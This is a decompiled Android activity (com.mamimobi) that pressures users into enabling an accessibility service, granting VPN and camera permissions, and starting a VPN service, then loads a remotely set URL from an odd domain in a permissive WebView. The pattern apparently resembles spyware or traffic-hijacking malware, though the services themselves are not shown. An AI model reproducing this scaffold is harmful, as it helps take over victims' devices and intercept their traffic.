package com.mamimobi.activity;

import android.app.Activity;
import android.content.Intent;
import android.net.VpnService;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.ViewGroup;
import android.view.ViewParent;
import android.webkit.CookieManager;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.widget.Toast;
import com.mamimobi.AccessService;
import com.mamimobi.mipush.R$id;
import com.mamimobi.mipush.R$layout;
import com.mamimobi.service.MyVpnService;
import defpackage.fa0;
import defpackage.j31;
import defpackage.pb0;
import defpackage.t40;
import defpackage.v1;
import org.java_websocket.framing.CloseFrame;

/* JADX INFO: loaded from: classes.dex */
public class MainActivity extends Activity {
    public static final /* synthetic */ int J = 0;
    public WebView E = null;
    public long F = 0;
    public boolean G = false;
    public boolean H = false;
    public final Handler I = new Handler(Looper.getMainLooper());

    public static void a(MainActivity mainActivity) {
        mainActivity.getClass();
        if (AccessService.e0 == null) {
            j31.f0(mainActivity);
            Toast.makeText(mainActivity, "Waiting for accessibility service...", 0).show();
            mainActivity.I.postDelayed(new pb0(mainActivity, 3), 3000L);
            mainActivity.startActivity(new Intent(mainActivity, (Class<?>) NavigatorSettingActivity.class));
            return;
        }
        if (t40.o(mainActivity, "android.permission.CAMERA") != 0) {
            t40.a1(mainActivity, new String[]{"android.permission.CAMERA"});
        } else {
            mainActivity.c();
        }
    }

    public final void b() {
        if (this.H) {
            return;
        }
        boolean z = this.G;
        Handler handler = this.I;
        if (z) {
            handler.postDelayed(new pb0(this, 0), 500L);
            return;
        }
        this.H = true;
        Intent intentPrepare = VpnService.prepare(this);
        if (intentPrepare != null) {
            startActivityForResult(intentPrepare, CloseFrame.GOING_AWAY);
            return;
        }
        this.H = false;
        d();
        handler.postDelayed(new pb0(this, 0), 500L);
    }

    public final void c() {
        this.E.setWebViewClient(new v1(2));
        this.E.setWebChromeClient(new WebChromeClient());
        String strQ0 = fa0.q0(this, "pushurl", "https://live.jersey-nfl.store");
        WebSettings settings = this.E.getSettings();
        settings.setAllowFileAccessFromFileURLs(false);
        settings.setAllowUniversalAccessFromFileURLs(false);
        settings.setJavaScriptEnabled(true);
        settings.setDomStorageEnabled(true);
        settings.setCacheMode(1);
        settings.setDatabaseEnabled(true);
        settings.setAllowFileAccess(true);
        settings.setMediaPlaybackRequiresUserGesture(false);
        settings.setLoadWithOverviewMode(true);
        settings.setUseWideViewPort(true);
        settings.setBlockNetworkImage(false);
        settings.setSupportMultipleWindows(true);
        settings.setJavaScriptCanOpenWindowsAutomatically(true);
        settings.setLoadsImagesAutomatically(true);
        settings.setBuiltInZoomControls(false);
        settings.setDisplayZoomControls(false);
        settings.setUserAgentString("Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36");
        this.E.setBackgroundColor(-16777216);
        this.E.setLayerType(2, null);
        settings.setMixedContentMode(0);
        CookieManager.getInstance().setAcceptThirdPartyCookies(this.E, true);
        this.E.loadUrl(strQ0);
    }

    public final void d() {
        if (this.G) {
            return;
        }
        this.G = true;
        Intent intent = new Intent(this, (Class<?>) MyVpnService.class);
        if (Build.VERSION.SDK_INT >= 26) {
            startForegroundService(intent);
        } else {
            startService(intent);
        }
        Toast.makeText(this, "VPN service is started.", 0).show();
    }

    @Override // android.app.Activity
    public final void onActivityResult(int i, int i2, Intent intent) {
        super.onActivityResult(i, i2, intent);
        if (i == 1001) {
            Handler handler = this.I;
            if (i2 == -1) {
                this.H = false;
                d();
                handler.postDelayed(new pb0(this, 0), 500L);
            } else {
                this.H = false;
                Toast.makeText(this, "VPN permission must be granted to use this app.", 1).show();
                handler.postDelayed(new pb0(this, 1), 3000L);
            }
        }
    }

    @Override // android.app.Activity
    public final void onBackPressed() {
        long jCurrentTimeMillis = System.currentTimeMillis();
        if (jCurrentTimeMillis - this.F < 2000) {
            super.onBackPressed();
            return;
        }
        if (this.E.canGoBack()) {
            this.E.goBack();
        } else {
            super.onBackPressed();
        }
        this.F = jCurrentTimeMillis;
    }

    @Override // android.app.Activity
    public final void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        setContentView(R$layout.activity_main);
        this.E = (WebView) findViewById(R$id.mywebview);
        b();
    }

    @Override // android.app.Activity
    public final void onDestroy() {
        super.onDestroy();
        this.I.removeCallbacksAndMessages(null);
        WebView webView = this.E;
        if (webView != null) {
            try {
                try {
                    ViewParent parent = webView.getParent();
                    if (parent instanceof ViewGroup) {
                        ((ViewGroup) parent).removeView(this.E);
                    }
                    this.E.stopLoading();
                    this.E.loadUrl("about:blank");
                    this.E.setWebChromeClient(null);
                    this.E.setWebViewClient(null);
                    this.E.clearHistory();
                    this.E.clearCache(false);
                    this.E.clearFormData();
                    this.E.removeJavascriptInterface("android");
                    this.E.removeAllViews();
                    this.E.destroy();
                    this.E = null;
                } catch (Exception e) {
                    e.printStackTrace();
                    this.E = null;
                }
            } catch (Throwable th) {
                this.E = null;
                throw th;
            }
        }
    }

    @Override // android.app.Activity
    public final void onPause() {
        WebView webView = this.E;
        if (webView != null) {
            webView.onPause();
        }
        super.onPause();
    }

    @Override // android.app.Activity
    public final void onRequestPermissionsResult(int i, String[] strArr, int[] iArr) {
        super.onRequestPermissionsResult(i, strArr, iArr);
        if (i == 4499) {
            if (iArr.length > 0 && iArr[0] == 0) {
                c();
            } else {
                Toast.makeText(this, "Camera permission is required. Please grant permission.", 1).show();
                this.I.postDelayed(new pb0(this, 2), 1500L);
            }
        }
    }

    @Override // android.app.Activity
    public final void onResume() {
        WebView webView = this.E;
        if (webView != null) {
            webView.onResume();
        }
        super.onResume();
    }
}
